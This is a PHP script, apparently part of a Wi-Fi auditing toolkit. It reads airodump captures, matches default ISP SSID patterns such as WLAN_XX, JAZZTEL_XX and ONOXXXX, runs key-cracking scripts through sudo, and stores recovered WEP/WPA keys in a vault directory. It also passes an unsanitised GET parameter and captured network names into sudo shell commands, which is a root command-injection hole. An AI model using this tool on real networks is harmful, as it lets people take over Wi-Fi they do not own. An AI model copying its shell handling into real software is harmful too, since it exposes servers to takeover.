<?php

	function show_mac($mac) {
		$demo=false;
		$mac=strtoupper($mac);
		if ($demo) return substr($mac,0,9)."XX:XX:XX"; else return $mac;
	}

	function show_password($password) {
		$demo=false;
		if ($demo) return substr("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",0,strlen($password)); else return $password;
	}

	$string_ok="";
	$string_ko="";
	$string_cand="";
	$tiempo_inicio = microtime(true);
	$airodump_file = $_GET["file"];
	$airodump_file_cap = str_replace(".csv",".cap",$airodump_file);

	$cont=0;
	$cont_g=0;
	exec("sudo strings $airodump_file",$lines);
	foreach ($lines as $line_num => $line) {
		$num_campos = substr_count($line,',');
		if ($num_campos==14) {
			list($c1, $c2, $c3, $c4, $c5,$c6,$c7,$c8,$c9,$c10,$c11,$c12,$c13,$c14,$c15) = explode(",", trim($line),15);	
			$c1=trim($c1);$c2=trim($c2);$c3=trim($c3);$c4=trim($c4);$c5=trim($c5);$c6=trim($c6);$c7=trim($c7);$c8=trim($c8);$c9=trim($c9);$c10=trim($c10);$c11=trim($c11);$c12=trim($c12);$c13=trim($c13);$c14=trim($c14);
			if ( strlen($c1)==17  && is_numeric($c4)==true && is_numeric($c9)==true && $c9 != -1 && is_numeric($c10)==true && is_numeric($c11)==true && $c14!="" ){
				$cont_g++;
				if (strrpos($c6, "WEP") !== false && strrpos($c7, "WEP") !== false) $c6="WEP"; 
				if (strrpos($c6, "WPA2") !== false ) $c6="WPA2";
				if (strrpos($c6, "WPA OPN") !== false ) $c6="WPA";
				$wifis[] = array('bssid'=>$c1,'priv1'=>$c6,'priv2'=>$c7,'priv3'=>$c8,'pow'=>$c9,'ch'=>$c4,'beacs'=>$c10,'ivs'=>$c11,'essid'=>$c14);
				$cont++;
			}
		}
	}

	if ( $cont > 0 ) { 
		$cont_ok=0;
		$string_ok="";
		$cont_ko=0;
		$string_ko="";
		$cont_cand=0;
		$string_cand="";
		foreach ($wifis as $row => $wifi) {
			$c1 = $wifi['bssid'];
			$c6 = $wifi['priv1'];
			$c7 = $wifi['priv2'];
			$c8 = $wifi['priv3'];
			$c9 = $wifi['pow'];
			$c4 = $wifi['ch'];
			$c10 = $wifi['beacs'];
			$c11 = $wifi['ivs'];
			$c14 = $wifi['essid'];
			$estado="";
			$clave="";

			if (file_exists("../data/keys/".trim($c1).".key")) {
				$clave=exec("sudo cat ../data/keys/$c1.key 2>/dev/null");
			}
				
			$auto_crack=0;
			$base_bssid = substr($c1, 0, 8);
			if ($clave=="") {
				// WLAN_XX
				if ( substr($c14, 0, 5) == "WLAN_" && strlen($c14) == 7 && $c6 == "WEP" ) {
					$auto_crack=3; $auto_crack_text="WLAN_XX";
				}
				// WLAN_XXXX
				if ( substr($c14, 0, 5) == "WLAN_" && strlen($c14) == 9 && $c6 == "WPA" ) {
					$auto_crack=1; $auto_crack_text="WLAN_XXXX";
				}
				// WLANXXXXXX
				if ( substr($c14, 0, 4) == "WLAN" && strlen($c14) == 10 && ( $c6 == "WEP" || $c6 == "WPA" ) ) {
					$auto_crack=5; $auto_crack_text="WLANXXXXXX";
				}
				// JAZZTEL_XX
				if ( substr($c14, 0, 8) == "JAZZTEL_" && strlen($c14) == 10 && $c6 == "WEP" ) {
					$auto_crack=4; $auto_crack_text="JAZZTEL_XX";
				}		
				// JAZZTEL_XXXX
				if ( substr($c14, 0, 8) == "JAZZTEL_" && strlen($c14) == 12 && $c6 =="WPA" ) {
					$auto_crack=1; $auto_crack_text="JAZZTEL_XXXX";
				}
				// YACOMXXXXXX
				if ( substr(strtolower($c14), 0, 5) == "yacom" && strlen($c14) == 11 && ( $c6 == "WEP" || $c6 == "WPA" )) {
					$auto_crack=5; $auto_crack_text="YACOMXXXXXX";
				}
				// WIFIXXXXXX
				if ( substr(strtolower($c14), 0, 4) == "wifi" && strlen($c14) == 10 && ( $c6 == "WEP" || $c6 == "WPA" )) {
					$auto_crack=8; $auto_crack_text="WIFIXXXXXX";
				}
				// ONOXXXX
				if ( substr(strtolower($c14), 0, 3) == "ono" && strlen($c14) == 7 && $c6 == "WEP" && is_numeric(substr($c14,3,4)) == true) {
					$auto_crack=7; $auto_crack_text="ONOXXXX";
				}
				if ( $auto_crack==1 || $auto_crack==3 || $auto_crack==4 || $auto_crack==5 || $auto_crack==7 ) {

					$cont_cand++;

					list($b1, $b2, $b3, $b4, $b5, $b6) = explode(":", $c1,6);
					$string_cand = $string_cand . "[$cont_cand] Key AP Candidate ".show_mac($c1)." - $c14: [ Pattern: $auto_crack_text - IVs: $c11 ]<br>";
					
					if ($c11>=3) {
						echo "&nbsp;&nbsp;[+] Cracking AP ".show_mac($c1)." - $c14<br>";
						if ( $auto_crack==1 ) system ("sudo bash wlanjazz_xxxx $c1 $c14 $airodump_file_cap");
						if ( $auto_crack==3 ) system ("sudo bash wlan_xx $c1 $c14 $airodump_file_cap");
						if ( $auto_crack==4 ) system ("sudo bash jazztel_xx $c1 $c14 $airodump_file_cap");
						if ( $auto_crack==5 ) system ("sudo bash wlanxxxxxx $c1 $c14 $airodump_file_cap");
						if ( $auto_crack==7 ) system ("sudo bash onoxxxx $c1 $c14 $airodump_file_cap");

						$clave="";
						while ($clave=="") {
							$clave=exec("sudo cat /tmp/$c1.key 2>/dev/null");
						};

						list($b1, $b2, $b3, $b4, $b5, $b6) = explode(":", $c1,6);

						if ($clave == "ERROR 1") {
							echo "&nbsp;&nbsp;&nbsp;&nbsp;[-] Dictionary is not available for this BSSID: ".show_mac($c1)."<br>";
							exec("sudo echo K1 > ../data/keys/$c1.key");
						} else { 
							if ($clave == "ERROR 2") {
								$num_pqt = intval(trim(exec("sudo cat /tmp/$c1.pqt 2>/dev/null")));
								if (is_numeric($num_pqt) != true ) { $num_pqt=0;}
								echo "&nbsp;&nbsp;&nbsp;&nbsp;[-] Not enough IVs: $num_pqt<br>";
								exec("sudo echo K2 > ../data/keys/$c1.key");

							} else { 
								if ($clave == "ERROR 3") {
									$num_pqt = intval(trim(exec("sudo cat /tmp/$c1.pqt 2>/dev/null")));
									echo "&nbsp;&nbsp;&nbsp;&nbsp;[-] Key not present in the dictionary.<br>";
									exec("sudo echo K3 > ../data/keys/$c1.key");
								} else {
									echo "&nbsp;&nbsp;&nbsp;&nbsp;[-] Key: ".show_password($clave)."<br>";
									exec("sudo echo $clave > ../data/keys/$c1.key");
									exec("sudo echo $clave > ../data/vault/$c1.key");
								}
							}
						}
						echo "<br>";
						system ("sudo rm \"/tmp/$c1.key\" >/dev/null 2>/dev/null");
						system ("sudo rm \"/tmp/$c1.pqt\" >/dev/null 2>/dev/null");
						break;
					}
				}
			} else {
				$texto = $clave;
				list($b1, $b2, $b3, $b4, $b5, $b6) = explode(":", $c1,6);
				if ($clave=="K1") $texto="Dictionary is not available for this BSSID";
				if ($clave=="K2") $texto="Not enough IVs";
				if ($clave=="K3") $texto="Key not present in the dictionary";	
				if ($clave=="K1" || $clave=="K2" || $clave=="K3") {
					$cont_ko++;
					$string_ko = $string_ko . "<font color=#FF0000>[$cont_ko] Key AP ERROR ".show_mac($c1)." - $c14: [$clave] $texto</font>\n";
				} else {
					$cont_ok++;
					$string_ok = $string_ok . "<font color=#00FF00>[$cont_ok] Key AP OK ".show_mac($c1)." - $c14: ".show_password($texto)."</font>\n";
				}
			}
		}
	}
	echo "<pre>";
	echo $string_ok;
	echo "\n";
	echo $string_ko;
	echo "\n";
	echo $string_cand;
	echo "</pre>";
	date_default_timezone_set("Europe/Madrid");
	$fecha = date("G:i:s d/m/Y");
	$tiempo_fin = microtime(true);
	echo "<br>";
	echo "Render Time: " . round($tiempo_fin - $tiempo_inicio, 4) . "<br>";
	echo "Last Render: $fecha";
?>
